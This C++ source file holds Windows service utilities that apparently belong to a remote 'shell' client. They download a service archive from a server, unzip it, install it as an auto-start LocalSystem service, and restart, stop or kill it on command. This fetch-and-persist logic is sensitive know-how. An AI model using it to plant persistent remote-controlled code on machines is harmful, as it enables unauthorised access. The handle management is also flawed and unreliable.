#include "serviceutils.h"
#include "client.h"
#include "utils.h"

bool Service::ServiceExists(LPCSTR lpServiceName) {
	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, GENERIC_READ);
	SC_HANDLE hService = OpenService(hManager, lpServiceName, GENERIC_READ);
	CloseServiceHandle(hManager);
	//if service exists it returns a valid handle
	if (hService != NULL) {
		CloseServiceHandle(hService);
		return true;
	}
	return false;
}

void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
{
	SC_HANDLE scm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
	if (scm == NULL)
		return;

	SC_HANDLE hService = OpenService(scm, lpServiceName, GENERIC_READ);
	if (hService == NULL)
	{
		CloseServiceHandle(scm);
		return;
	}

	SERVICE_STATUS status;
	LPSERVICE_STATUS pstatus = &status;
	if (QueryServiceStatus(hService, pstatus) == 0)
	{
		CloseServiceHandle(hService);
		CloseServiceHandle(scm);
		return;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(scm);


	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hManager == NULL) {
		CloseServiceHandle(hManager);
		return;
	}
	hService = OpenService(hManager, lpServiceName, SC_MANAGER_ALL_ACCESS);
	if (hService == NULL)
	{
		CloseServiceHandle(scm);
		return;
	}

	//If the service is paused
	if (status.dwCurrentState == SERVICE_PAUSED || status.dwCurrentState == SERVICE_PAUSE_PENDING) {
		Log("Restarting pause service\n");
		ControlService(hService, SERVICE_CONTROL_CONTINUE, &status);
	}
	else if (status.dwCurrentState == SERVICE_STOPPED || status.dwCurrentState == SERVICE_STOP_PENDING) {
		Log("Restarting stopped service\n");
		StartService(hService, 0, NULL);
	}
}


void Service::CheckAndRepairService(bool called_itself)
{
	if (!FileExists(SHELL_PATH(SERVICE_FILE_NAME))) {
		Log("Service doesn't exist, downloading it...\n");
		//Download service archive
		int i = 0;
		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true)) {
			if (i > 9)
				return;
			Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true);
			i++;
		}
		//Wait for file existence
		while (GetFileAttributesA(SHELL_PATH(SERVICE_ARCHIVE_NAME)) == INVALID_FILE_ATTRIBUTES) {
			if (!Client::connected || !General::IsInternetAvailable()) {
				Log("Lost connection\n");
				return;
			}
			Sleep(100);
		}
		//Unzip archive
		while (!unzip(std::string(SHELL_PATH(SERVICE_ARCHIVE_NAME)), GetCWD())) {
			Sleep(1000);
		}
		//Delete archive
		remove((SHELL_PATH(SERVICE_ARCHIVE_NAME)));
		if (!Service::ServiceExists(SERVICE_NAME)) {

			//Create service
			while (!InstallService(SERVICE_NAME, SHELL_PATH(SERVICE_FILE_NAME))) {
				Log("Could not install service\n");
				Sleep(1000);
			}
		}
		else {
			Log("Service exists\n");
		}
	}


	//Start the service
	Service::StartServiceIfNeeded(SERVICE_NAME);

	if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME)) && !called_itself) { //This means that an update instruction has been sent and therefore backup shell needs to shutdown once the service has been started
		//Delete the service and let checker recreate it at next iteration of the main loop
		SC_HANDLE scm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
		if (scm == NULL)
			return;
		SC_HANDLE hService = OpenService(scm, SERVICE_NAME, DELETE | SERVICE_STOP);

		if (hService == NULL)
		{
			return;
		}

		SERVICE_STATUS serviceStatus = { 0 };
		ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&serviceStatus);

		CloseServiceHandle(hService);
		CloseServiceHandle(scm);

		HANDLE hProc = 0;
		auto procID = Utils::getProcess(SERVICE_FILE_NAME);
		if (procID) {
			Log("Found service process ID\n");
			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
			TerminateProcess(hBackupShell, 1);
			CloseHandle(hBackupShell);
		}
		else {
			Log("Could not find service process ID\n");
		}

		while (remove(SHELL_PATH(SERVICE_FILE_NAME))) {
			Log("Couldn't remove service file\n");
			Sleep(100);
		}


		//remove(SHELL_PATH(SHELL_UPDATE_NAME));
		Log("Deleted service\n");
		CheckAndRepairService(true);

		PauseAndExit(10);
	}
}

bool Service::InstallService(LPCSTR lpServiceName, LPCSTR lpServicePath)
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		return false;
	}

	// Create the service

	schService = CreateService(
		schSCManager,              // SCM database 
		lpServiceName,                   // name of service 
		SERVICE_DISPLAY_NAME,                   // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START,      // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		lpServicePath,                    // path to service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 
	if (schService == NULL)
	{
		wprintf(L"CreateService failed w/err 0x%08lx\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return false;
	}
	Log("Created service\n");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return true;
}